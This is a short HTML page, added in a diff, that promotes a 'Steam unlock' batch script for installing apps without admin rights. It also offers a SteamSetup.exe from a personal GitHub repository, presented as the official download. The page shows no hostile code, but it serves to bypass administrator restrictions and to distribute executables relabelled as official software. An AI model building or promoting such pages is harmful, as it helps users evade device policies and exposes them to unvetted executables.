@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Steam - unblock Download</title>
+</head>
+<body>
+
+    <h1 class="title">Steam unlock</h1>
+
+    <div class="container">
+        <div class="cta">
+            <h2>Download steam official</h2>
+            <p>Download steam setup to test the script and download it with admin rights</p>
+            <button onclick="download()">steam</button>
+        </div>
+    
+        <div class="cta">
+            <h2>Download unlock script</h2>
+            <p>Download this script to download any app with needing admin rights</p>
+            <button onclick="download_script()">script</button>
+        </div>
+    </div>
+
+    <script>
+        function download_script() {
+            window.location.href = "https://github.com/cheaderthecoder/admin-rights-script/blob/main/unlock.bat";
+        }
+
+        function download() {
+            window.location.href = "https://github.com/cheaderthecoder/admin-rights-script/blob/main/SteamSetup.exe";
+        }
+    </script>
+
+</body>
+</html>
